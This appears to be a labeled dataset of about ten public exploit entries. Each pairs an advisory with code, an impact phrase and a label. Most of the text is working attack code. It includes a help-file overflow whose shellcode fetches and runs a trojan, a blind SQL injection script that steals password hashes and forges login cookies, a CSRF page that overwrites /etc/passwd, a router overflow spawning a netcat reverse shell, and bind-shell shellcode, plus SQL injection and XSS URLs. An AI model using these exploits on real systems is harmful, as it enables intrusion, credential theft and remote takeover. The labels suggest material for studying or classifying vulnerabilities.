22289,"Microsoft Windows XP/ME - Help and Support Center Buffer Overflow // source: https://www.securityfocus.com/bid/6966/info  The Microsoft Windows ME Help and Support Center is prone to a buffer overflow. This is due to insufficient bounds checking on input supplied through the HCP URI parameter.  An attacker can exploit this vulnerability by making a HCP request with an overly long string. This will trigger the overflow condition and may result in malicious attacker-supplied code being executed on the vulnerable system.  A similar vulnerability was reported in the Windows XP Help and Support Center (BID 6802). These vulnerabilities may be related.  ** Conflicting details have been reported about this vulnerability. The discoverer claims that the issue is cross site scripting that allows script code emebedded into the HCP URL to be executed. The discoverer also claims that Windows XP without SP1 is also vulnerable to this issue, while Microsoft claims that it is not.  /*************************************************  * s0h - Skin Of Humanity.  * http://s0h.cc  *  * Title : Win32hlp exploit for : "":LINK overflow""  * Date : Sunday, 9 March, 2003 1:00 AM   *  * -----------------------------------------------  *    * Archive : http://s0h.cc/exploit/s0h_Win32hlp.c  * Binary : http://s0h.cc/exploit/s0h_Win32hlp.exe  *   * -----------------------------------------------  * Discovered by ThreaT <threat@s0h.cc>.  * Coded by ThreaT <threat@s0h.cc>  * Hompage : http://s0h.cc/~threat/  *   * Winhlp32.exe exploit for ':LINK' overflow !  *   * -----------------------------------------------  *  * This exploit can trap a .CNT file (file with .-  * HLP files) with the arbitrary code who can dow-  * nload and execute a trojan without user ask.  *  * -----------------------------------------------  *   * Compiling : cl /nologo s0h_Win32hlp.c  * Usage : s0h_Win32hlp.exe <trojan> <CNT file> [offset]  * Eq : C:\>s0h_Win32hlp.exe http://www.chez.com/mvm/trojan.exe c:\WINNT\Help\mplayer2.cnt 4  *   * <trojan> = host to download the trojan (http:/-  * /blah.plof/trojan.exe).  *   * <CNT file> = The CNT file.  *   * [offset] = Optionnal. This one defined a numbe-  * r between 0 and 15 that can play with the retu-  * rn address. Generaly, you must used 4 if the .-  * HLP file is called by an application.  *   * -----------------------------------------------  * This exploit was tested on :  * 	- Windows 2000 PRO/SERVER (fr) SP0  * 	- Windows 2000 PRO/SERVER (fr) SP1  *	- Windows 2000 PRO/SERVER (fr) SP2  *  ************************************************/   #include <windows.h>  #define taille	270 #define VulnLen	650  int main (int argc, char *argv[]) {  	HANDLE ExploitFile; 	DWORD lpNumberOfBytesWritten, lpFileSizeHigh, FileSize;  	int i,j, len, RetByte=0xE5;  	char *file, *url;  unsigned char *Shellcode, *buffer,  RealGenericShellcode[] =  ""\x68\x5E\x56\xC3\x90\x8B\xCC\xFF\xD1\x83\xC6\x0E\x90\x8B\xFE\xAC"" ""\x34\x99\xAA\x84\xC0\x75\xF8""  ""\x72\xeb\xf3\xa9\xc2\xfd\x12\x9a\x12\xd9\x95\x12\xd1\x95\x12\x58\x12\xc5\xbd\x91"" ""\x12\xe9\xa9\x9a\xed\xbd\x9d\xa1\x87\xec\xd5\x12\xd9\x81\x12\xc1\xa5\x9a\x41\x12"" ""\xc2\xe1\x9a\x41\x12\xea\x85\x9a\x69\xcf\x12\xea\xbd\x9a\x69\xcf\x12\xca\xb9\x9a"" ""\x49\x12\xc2\x81\xd2\x12\xad\x03\x9a\x69\x9a\xed\xbd\x8d\x12\xaf\xa2\xed\xbd\x81"" ""\xed\x93\xd2\xba\x42\xec\x73\xc1\xc1\xaa\x59\x5a\xc6\xaa\x50\xff\x12\x95\xc6\xc6"" ""\x12\xa5\x16\x14\x9d\x9e\x5a\x12\x81\x12\x5a\xa2\x58\xec\x04\x5a\x72\xe5\xaa\x42"" ""\xf1\xe0\xdc\xe1\xd8\xf3\x93\xf3\xd2\xca\x71\xe2\x66\x66\x66\xaa\x50\xc8\xf1\xec"" ""\xeb\xf5\xf4\xff\x5e\xdd\xbd\x9d\xf6\xf7\x12\x75\xc8\xc8\xcc\x66\x49\xf1\xf0\xf5"" ""\xfc\xd8\xf3\x97\xf3\xeb\xf3\x9b\x71\xcc\x66\x66\x66\xaa\x42\xca\xf1\xf8\xb7\xfc"" ""\xe1\x5f\xdd\xbd\x9d\xfc\x12\x55\xca\xca\xc8\x66\xec\x81\xca\x66\x49\xaa\x42\xf1"" ""\xf0\xf7\xdc\xe1\xf3\x98\xf3\xd2\xca\x71\xb5\x66\x66\x66\x14\xd5\xbd\x89\xf3\x98"" ""\xc8\x66\x49\xaa\x42\xf1\xe1\xf0\xed\xc9\xf3\x98\xf3\xd2\xca\x71\x8b\x66\x66\x66"" ""\x66\x49\x71\xe6\x66\x66\x66"";   printf ("" * ***************************************************** *\n"" 	"" *                 s0h - Skin of humanity                *\n"" 	"" *                    http://s0h.cc/                     *\n"" 	"" * ***************************************************** *\n"" 	""     Win32hlp exploit for : \"":LINK overflow\""           *\n"" 	"" * ***************************************************** *\n"" 	"" * Discovered by ThreaT <threat@s0h.cc>.                 *\n"" 	"" * Coded by ThreaT <threat@s0h.cc>                       *\n"" 	"" * Hompage : http://s0h.cc/~threat/                      *\n""  	"" * Archive : http://s0h.cc/exploit/s0h_Win32hlp.c        *\n"" 	"" * ***************************************************** *\n"" 	);  if (argc < 3) { 	printf( 		"" * ***************************************************** *\n"" 		"" * Usage : s0h_Win32hlp.exe <trojan> <CNT file> [offset] *\n"" 		"" *                                                       *\n"" 		"" * <trojan> = host to download the trojan (http:/-       *\n"" 		"" * /blah.plof/trojan.exe).                               *\n"" 		"" *                                                       *\n"" 		"" * <CNT file> = The CNT file.                            *\n"" 		"" *                                                       *\n"" 		"" * [offset] = Optionnal. This one defined a number betw- *\n"" 		"" * een 0 and 15 that can play with the return address. - *\n"" 		"" * Generaly, you must used 4 if the .HLP file is called  *\n"" 		"" * by an application.                                    *\n"" 		"" * ***************************************************** *\n""	 	);  	ExitProcess (1); }  if (argv[3]) RetByte = atoi (argv[3]) + 0xE0;  len = taille + strlen (argv[1]) + 2 + 4; url = (char *) malloc (strlen (argv[1])); strcpy (url, argv[1]);  /* * Create the final shellcode */  Shellcode = (unsigned char *) malloc (len);  // encrypt the URL for (i=0;i<strlen (argv[1]); argv[1][i++]^=0x99);  // inject the RealGenericShellcode in the shellcode buffer for (i=0;i<taille; Shellcode[i]=RealGenericShellcode[i++]);  // append crypted URL to the shellcode buffer for (i,j=0;i<len - 1;Shellcode[i++]=argv[1][j++]);   Shellcode[len-6]=0x99; // URL delimitation Shellcode[len-5]=0x2E; // fuck the winhlp32.exe parser  // append the RET ADDR // Play with this bytes if the xploit don't work Shellcode[len-4]=0x30; Shellcode[len-3]=RetByte; Shellcode[len-2]=0x06; Shellcode[len-1]=0x00;   /*  Now, we make a vuln string for our exploit */  buffer = (unsigned char *) malloc (VulnLen); memset (buffer,0,VulnLen);  lstrcpy (buffer,"":Link ""); for (i=6; i < VulnLen - len; buffer[i++] = (char)0x90); for (i,j=0; i < VulnLen; buffer[i++] = Shellcode[j++]);   /* Trap the CNT file specified with the vuln string */  ExploitFile = CreateFile (argv[2],GENERIC_READ+GENERIC_WRITE, 			  FILE_SHARE_READ+FILE_SHARE_WRITE,NULL, 			  OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);  if ( ExploitFile == INVALID_HANDLE_VALUE) { 	printf (""Error : cannot open cnt file '%s'\n"",argv[2]); 	ExitProcess (1); }  	FileSize = GetFileSize(ExploitFile, &lpFileSizeHigh); 	FileSize += lpFileSizeHigh*MAXDWORD;  	file = (char *)LocalAlloc (LPTR, FileSize + 2); 	file[0] = 0x0d; 	file[1] = 0x0a; 	file += 2;   	ReadFile(ExploitFile,file,FileSize,&lpNumberOfBytesWritten,NULL); 	 	SetFilePointer (ExploitFile,0,NULL,FILE_BEGIN); 	WriteFile (ExploitFile,buffer,VulnLen,&lpNumberOfBytesWritten,NULL); 	 	file -= 2; 	WriteFile (ExploitFile,file,FileSize+2,&lpNumberOfBytesWritten,NULL); 	 	CloseHandle(ExploitFile); 	         printf ( 		"" * *******************************************************\n"" 		"" * The file is now traped and ready to download and exe- *\n"" 		"" * cute :                                                *\n"" 		"" * File : %s\n"" 		"" * At : %s\n"" 		"" * *******************************************************\n"" 		,argv[2],url); 		 		if (RetByte != 0xE5) 			printf ( 				"" * *******************************************************\n"" 				"" * You have specified this address : 0x0006%x30          *\n"" 				"" * The abitrary will loaded since an application.        *\n"" 				"" * *******************************************************\n"" 				,RetByte); 			  	return 0; }",malicious attacker-supplied code being executed on the vulnerable system,1
38758,"SuperScan 4.1 - Scan Hostname/IP Field Buffer Overflow #!/usr/bin/env python # -*- coding: utf-8 -*- # Exploit Title     : SuperScan 4.1 Scan Hostname/IP Field Buffer Overflow Crash PoC # Discovery by      : Luis Martínez # Email		    : l4m5@hotmail.com # Discovery Date    : 18/11/2015 # Vendor Homepage   : http://www.foundstone.com # Software Link     : http://www.mcafee.com/us/downloads/free-tools/superscan.aspx # Tested Version    : 4.1 # Vulnerability Type    : Denial of Service (DoS) Local # Tested on OS      : Windows XP Professional SP3 x86 es # Steps to Produce the Crash:  # 1.- Run python code : python super_scan_4.1.py # 2.- Open super_scan_4.1.txt and copy content to clipboard # 3.- Open SuperScan4.1.exe # 4.- Paste Clipboard Scan > Hostname/IP # 5.- Clic on add button (->) # 6.- Crashed  buffer = ""\x41"" * 636 eip = ""\x42"" * 4  f = open (""super_scan_4.1.txt"", ""w"") f.write(buffer + eip) f.close()",Denial of Service,1
4678,"Seditio CMS 121 - SQL Injection <?php ## Seditio CMS <= 121 Remote SQL Injection Exploit ## Software site: http://www.neocrome.net/ ## By InATeam (http://inattack.ru/) ## Requirements: MySQL >= 4.1, magic_quotes_gpc=Off  echo ""------------------------------------------------------------\n""; echo ""Seditio CMS <= 121 Remote SQL Injection Exploit\n""; echo ""(c)oded by Raz0r, InATeam (http://inattack.ru/)\n""; echo ""dork: \""Powered by Seditio\""\n""; echo ""------------------------------------------------------------\n"";  if ($argc<2) { echo ""USAGE:\n""; echo ""~~~~~~\n""; echo ""php {$argv[0]} [url] OPTIONS\n\n""; echo ""[url]        - target server where Seditio CMS is installed\n\n""; echo ""OPTIONS:\n""; echo ""-p=<prefix>  - use specific prefix (default sed_)\n""; echo ""-id=<id>     - use specific user id (default 1)\n\n""; echo ""examples:\n""; echo ""php {$argv[0]} http://site.com/ -p=cms_\n""; echo ""php {$argv[0]} http://cms.site.com:8080/ -id=2\n""; die; }  error_reporting(0); set_time_limit(0); ini_set(""max_execution_time"",0); ini_set(""default_socket_timeout"",10); $url = $argv[1]; for($i=2;$i<$argc;$i++) {    if(strpos($argv[$i],""="")!==false) {        $exploded=explode(""="",$argv[$i]);        if ($exploded[0]=='-p') $prefix = $exploded[1];        if ($exploded[0]=='-id') $id = $exploded[1];    } } if (!isset($prefix)) $prefix = ""sed_""; if (!isset($id)) $id = 1; $url_parts = parse_url($url); $host = $url_parts['host']; if (isset($url_parts['port'])) $port = $url_parts['port']; else $port = 80; $path = $url_parts['path']; print(""[~] Connecting... ""); if (!getchar(""<1"",$i,false)) print(""OK\n""); else die(""\n[-] Exploit failed\n""); print(""    Getting hash...""); $hash=''; for ($i=1; $i<=32; $i++) {    if (!getchar("">57"",$i)) {        $min = 48;        $max = 57;           }    else {        $min = 97;        $max = 102;           }    for($j=$min;$j<=$max;$j++) {        if (getchar(""+LIKE+$j"",$i)) {            $hash .= chr($j);            break;        }    } } print(""[+] Done! hash - $hash\n""); print(""[+] Cookie to log in: \nSEDITIO="".base64_encode($id."":_:"".$hash."":_:ice"").""\n"");  function getchar($query,$pos,$status=true){    global $host,$path,$prefix,$id;    if ($status) status();    $data = ""sq=InATeam&frm_sub%5B%5D=9999&sea_frmtitle=1&sea_frmtext=1&sea_pagtitle=1"";    $data.= ""&sea_pagdesc=1&sea_pagtext=1&searchin_pag=1&pag_sub%5B%5D=qwerty')"";    $data.= ""+AND+1=IF(ORD(MID((SELECT+user_password+FROM+{$prefix}users+WHERE"";    $data.= ""+user_id={$id}),{$pos},1)){$query},1,(SELECT+1+UNION+SELECT+5))/*&x=GUEST"";       $packet  = ""POST {$path}plug.php?e=search&a=search HTTP/1.1\r\n"";    $packet .= ""Host: {$host}\r\n"";    $packet .= ""Referer: http://{$host}{$path}plug.php?e=search&a=search\r\n"";    $packet .= ""User-Agent: InAttack User Agent\r\n"";    $packet .= ""Content-Type: application/x-www-form-urlencoded\r\n"";    $packet .= ""Content-Length: "".strlen($data).""\r\n"";    $packet .= ""Connection: Close\r\n\r\n"";    $packet .= $data;    return (strpos(send($packet),'Subquery returns more than 1 row')===false) ? true : false; }  function send($packet) {    global $host,$port;    $ock = fsockopen(gethostbyname($host),$port);    if ($ock) {        fputs($ock, $packet);        $html='';        while (!feof($ock)) $html.=fgets($ock);    }    else die(""[-] Exploit failed\n"");    return $html; }  function status() {    static $n;    $n++;    if ($n > 3) $n = 0;    if($n==0){ print ""\r[-]\r""; }    if($n==1){ print ""\r[\\]\r"";}    if($n==2){ print ""\r[|]\r""; }    if($n==3){ print ""\r[/]\r""; } } ?>  # milw0rm.com [2007-11-29]",information disclosure,1
31603,"Parallels Virtuozzo Containers 3.0.0-25.4/4.0.0-365.6 VZPP Interface File Manger - Cross-Site Request Forgery source: https://www.securityfocus.com/bid/28589/info  Parallels Virtuozzo Containers is prone to a cross-site request-forgery vulnerability.  Exploiting the issue will allow a remote attacker to use a victim's currently active session to perform certain file-management actions with the privileges of the user running the application. Successful exploits will compromise affected computers.  Virtuozzo Containers 3.0.0-25.4.swsoft and 4.0.0-365.6.swsoft are vulnerable; other versions are also affected.  <!-- poplix papuasia.org -- http://px.dynalias.org -- 04-02-2008 this file exploits a vulnerable installation of virtuozzo web panel by overwriting /etc/passwd.demo tested against Version 365.6.swsoft (build: 4.0.0-365.6.swsoft). It doesn't work with older version due to paths changes. perform the following steps to test it: 1. create a blank /etc/passwd.demo on target machine 2. in this file replace 127.0.0.1 with target vps address 3. open a web browser and log into virtuozzo web interface 4. open this file in a new browser window and click the ""lets rock"" button when the page is fully loaded 5. check /etc/passwd.demo in the target vps filesystemm --> <script language=""JavaScript""> var ok=false; function letsgo(){ ok=true; document.getElementById('form0').submit(); } </script> <!-- this sets /etc as the current path--> <iframe style=""width:1px;height:1px;visibility:hidden"" name=ifr src=""https://127.0.0.1:4643/vz/cp/vzdir/infrman/envs/files/index?path=L2V0Yw=="" ></iframe> <iframe id=ifr1 style=""width:1px;height:1px;visibility:hidden"" name=ifr1 onload=""if(ok)document.getElementById('form1').submit();"" ></iframe> <iframe id=ifr2 style=""width:1px;height:1px;visibility:hidden"" name=ifr2 > </iframe> <!-- delete /etc/passwd.demo --> <form id=form0 target=ifr1 method=post action=""https://127.0.0.1:4643/vz/cp/vzdir/infrman/envs/files/list-control"" > <input type=hidden name=""file-name"" value=""passwd.demo""> <input type=hidden name=delete value=1> </form> <!-- create /etc/passwd.demo --> <form id=form1 target=ifr2 enctype=""multipart/form-data"" name=""defaultForm"" method=""POST"" action=""https://127.0.0.1:4643/vz/cp/vzdir/infrman/envs/files/create-file""> <input xmlns:http=""http://www.swsoft.com/xsl/cp/http"" type=""hidden"" name=""step"" value=""gen""> <input type=hidden name=""file_name"" value=""passwd.demo""> <input type=hidden name=""file_body"" value=""root::0:0::/root:/bin/bash""> <input type=hidden name=""next"" value=""Create""> </form> <input type=button value=""lets rock"" onclick=""letsgo()"">",perform certain file-management actions with the privileges of the user running the application,1
44074,"Dasan Networks GPON ONT WiFi Router H640X 12.02-01121 / 2.77p1-1124 / 3.03p2-1146 - Remote Code Execution ## Vulnerability Summary The following advisory describes a buffer overflow that leads to remote code execution found in Dasan Networks GPON ONT WiFi Router H640X versions 12.02-01121 / 2.77p1-1124 / 3.03p2-1146  Dasan Networks GPON ONT WiFi Router “is indoor type ONT dedicated for FTTH (Fibre to the Home) or FTTP (Fiber to the Premises) deployments. That can work as simple Bridge or behave as Router/NAT. It’s cost-effective CPE that meets carrier-class requirement for Telcom industry and guarantee reliable service proven in the field.”  ## Credit An independent security researcher, TigerPuma (at) Fosec.vn, has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program  ## Vendor response We tried to contact Dasan since October 8 2017, repeated attempts to establish contact went unanswered. At this time there is no solution or workaround for this vulnerability.  ## Vulnerability details All cgi in Dasan web service are symbolic link of cgipage.cgi, and when client request, lighttpd will invoke the corresponding path.  The buffer overflow vulnerability found in function login_action which handler login request.  The function uses strcpy without check length of input from client request.  If we will look at the stack, we can see that we can trigger the buffer overflow and in the end to control the pc.  ## Proof of Concept  ``` import sys import socket import json import time import struct import ssl  if len(sys.argv) != 4:     print ""Use: {} ip port connectback"".format(sys.argv[0])     sys.exit(1)  host = str(sys.argv[1]) port = int(sys.argv[2])  connectback = str(sys.argv[3])  buf = 1024 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #sock.settimeout(10)  clientsocket = ssl.wrap_socket(sock) #clientsocket = sock clientsocket.connect((host, port))  addr_libc = 0x2ad0c000 # 0x2ad0e000 with H640DW  # rop1 rop1 = addr_libc + 0x00115d40       #addiu $a0,$sp,0x18 |  jalr  $s0 addr_rop1 = struct.pack("">i"",rop1) #rop2 system = addr_libc + 0x0003CC9C     #system addr_system =  struct.pack("">i"",system)  # execute command command = ""nc "" + connectback + "" -e /bin/sh;""  payload = ""A""*(756 - 0x28) + addr_system + 'C'*(0x28-8) + addr_rop1 + ';'*24 + command  data = ""action={}&txtUserId=a&button=Login&txtPassword=a&sle_Language=english\r\n"".format(payload)  http_payload = """"""POST /cgi-bin/login_action.cgi HTTP/1.1\r\nHost: 192.168.1.100:8080\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nReferer: https://192.168.1.100:8080/cgi-bin/login.cgi\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\n\r\n{}"""""".format(len(data),data)  print http_payload  clientsocket.send(http_payload)  respond_raw = clientsocket.recv(buf).strip()  print respond_raw  respond_raw = clientsocket.recv(buf).strip()  print respond_raw respond_raw = clientsocket.recv(buf).strip()  print respond_raw  clientsocket.close() ```",remote code execution,1
25279,"ESMI PayPal StoreFront 1.7 - 'products1.php?id2' SQL Injection source: https://www.securityfocus.com/bid/12903/info   ESMI PayPal Storefront is prone to an SQL injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in as SQL query.   Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.   http://www.example.com/hv/ecdis/products1.php?id=6&id2='SQLINJECTION&subcat=Asus&p=products1",exploit vulnerabilities in the underlying database implementation,1
27029,"EZ Invoice Inc. EZI 2.0 - 'Invoices.php' SQL Injection source: https://www.securityfocus.com/bid/16133/info  EZI is prone to an SQL injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in an SQL query.  Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.   http://www.example.com/ezi/invoices.php?i=[SQL]",exploit vulnerabilities in the underlying database implementation,1
33579,"Ingres Database 9.3 - Heap Buffer Overflow source: https://www.securityfocus.com/bid/38001/info  Ingres Database is prone to a heap-based buffer-overflow vulnerability because the application fails to perform adequate boundary checks on user-supplied data.  Attackers can exploit this issue to execute arbitrary code with the privileges of the application or crash the affected application.  Ingres Database 9.3 on Unix is vulnerable; other versions may also be affected.  s = ""\x00\x00\x00\x00"" s += ""\xff\xff\xff\xff"" s += ""\x3c\x00\x00\x00\x06\x00\x00\x00"" s += ""A"" * 1000",the application fails to perform adequate boundary checks on user-supplied data,1
31820,"IBM Lotus Sametime 8.0 - Multiplexer Buffer Overflow source: https://www.securityfocus.com/bid/29328/info  IBM Lotus Sametime is prone to a remote buffer-overflow vulnerability because it fails to properly bounds-check user-supplied data before copying it to an insufficiently sized memory buffer.  An attacker can exploit this issue to execute arbitrary code within the context of the affected application. Failed exploit attempts will likely result in a denial of service.   #!perl # # ""IBM Lotus Sametime"" StMUX Stack Overflow Exploit # # Author:  Manuel Santamarina Suarez # e-Mail:  FistFuXXer@gmx.de #  use IO::Socket; use File::Basename;  # # destination TCP port # $port = 1533;  # # SE handler # # Don't use upper-case ASCII characters or 0x00, 0x0a, 0x0b, 0x0d, 0x20 # You MUST use a POP/POP/RET sequence that doesn't modify the ESP register # $seh = reverse( ""\x7C\x34\x10\xC2"" );  # POP ECX/POP ECX/RET                                        # msvcr71.7c3410c2                                        # universal  # # Shellcode # # Win32 Bind Shellcode (EXITFUNC=process, LPORT=4444) # $sc = ""\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45"".       ""\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49"".       ""\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d"".       ""\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66"".       ""\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61"".       ""\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40"".       ""\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32"".       ""\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6"".       ""\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09"".       ""\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0"".       ""\x66\x68\x11\x5c\x66\x53\x89\xe1\x95\x68\xa4\x1a\x70\xc7\x57\xff"".       ""\xd6\x6a\x10\x51\x55\xff\xd0\x68\xa4\xad\x2e\xe9\x57\xff\xd6\x53"".       ""\x55\xff\xd0\x68\xe5\x49\x86\x49\x57\xff\xd6\x50\x54\x54\x55\xff"".       ""\xd0\x93\x68\xe7\x79\xc6\x79\x57\xff\xd6\x55\xff\xd0\x66\x6a\x64"".       ""\x66\x68\x63\x6d\x89\xe5\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89"".       ""\xe2\x31\xc0\xf3\xaa\xfe\x42\x2d\xfe\x42\x2c\x93\x8d\x7a\x38\xab"".       ""\xab\xab\x68\x72\xfe\xb3\x16\xff\x75\x44\xff\xd6\x5b\x57\x52\x51"".       ""\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53"".       ""\xff\xd6\x6a\xff\xff\x37\xff\xd0\x8b\x57\xfc\x83\xc4\x64\xff\xd6"".       ""\x52\xff\xd0\x68\x7e\xd8\xe2\x73\x53\xff\xd6\xff\xd0"";  # # JUMP to 'ESP adjustment' and shellcode # $jmp = ""\x74\x23"".  # JE SHORT        ""\x75\x21"";  # JNZ SHORT   # # # Don't edit anything after this line # #   sub usage {     print ""Usage: "" . basename( $0 ) . "" [target] [IPv4 address]\n"".           ""Example: "". basename( $0 ) . "" 1 192.168.1.32\n"".           ""\n"".           ""Targets:\n"".           ""[1]  Lotus Sametime 7.5 on Windows Server 2000 SP4\n"".           ""[2]  Lotus Sametime 7.5 on Windows Server 2003 SP2\n"";     exit; }   # Net::IP::ip_is_ipv4 sub ip_is_ipv4 {     my $ip = shift;          if (length($ip) < 7) {         return 0;     }      unless ($ip =~ m/^[\d\.]+$/) {         return 0;     }      if ($ip =~ m/^\./) {         return 0;     }      if ($ip =~ m/\.$/) {         return 0;     }      if ($ip =~ m/^(\d+)$/ and $1 < 256) {         return 1     }      my $n = ($ip =~ tr/\./\./);      unless ($n >= 0 and $n < 4) {         return 0;     }      if ($ip =~ m/\.\./) {         return 0;     }      foreach (split /\./, $ip) {         unless ($_ >= 0 and $_ < 256) {             return 0;         }     }          return 1; }   print ""---------------------------------------------------\n"".       ' ""IBM Lotus Sametime"" StMUX Stack Overflow Exploit'.""\n"".       ""---------------------------------------------------\n\n"";  if( ($#ARGV+1) != 2 ) {     &usage; }  # Windows 2000 SP4 if( $ARGV[0] == 1 ) {     $popad = ""\x5b"" x 3 .     # POP EBX              ""\x61"" x 268 .   # POPAD              ""\xff\x24\x24"";  # JMP DWORD PTR SS:[ESP] } # Windows 2003 SP2 elsif( $ARGV[0] == 2 ) {     $popad = ""\x5b"" x 3 .     # POP EBX              ""\x61"" x 269 .   # POPAD              ""\xff\x24\x24"";  # JMP DWORD PTR SS:[ESP] } else {     &usage; }      if( ip_is_ipv4( $ARGV[1] ) ) {     $ip = $ARGV[1]; } else {     &usage; }  print ""[+] Connecting to $ip:$port...\n"";  $sock = IO::Socket::INET->new (     PeerAddr => $ip,     PeerPort => $port,     Proto    => 'tcp',     Timeout  => 2 ) or print ""[-] Error: Couldn't establish a connection to $ip:$port!\n"" and exit;  print ""[+] Connected.\n"".       ""[+] Trying to overwrite and control the SE handler...\n"";  $path = ""\x66"" x 44 . $jmp . $seh . ""\x66"" x 29 . $popad; $sock->send (     ""POST /CommunityCBR/CC.39.$path/\r\n"".     ""User-Agent: Sametime Community Agent\r\n"".     ""Host: $ip:1533\r\n"".     ""Content-Length: "". length( $sc ) .""\r\n"".     ""Connection: Close\r\n"".     ""Cache-Control: no-cache\r\n"".     ""\r\n"".     $sc );  sleep( 3 ); close( $sock );  print ""[+] Done. Now check for a bind shell on $ip:4444!\n"";",execute arbitrary code within the context of the affected application,1
29241,MaviPortal - 'Arama.asp' Cross-Site Scripting source: https://www.securityfocus.com/bid/21512/info  MaviPortal is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.   An attacker may leverage this issue to have arbitrary script code execute in the browser of an unsuspecting user. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  http://www.example.com/[scriptoath]/arama.asp?a_r_a_n_a_c_a_k= [xss Code],have arbitrary script code execute in the browser of an unsuspecting user,1
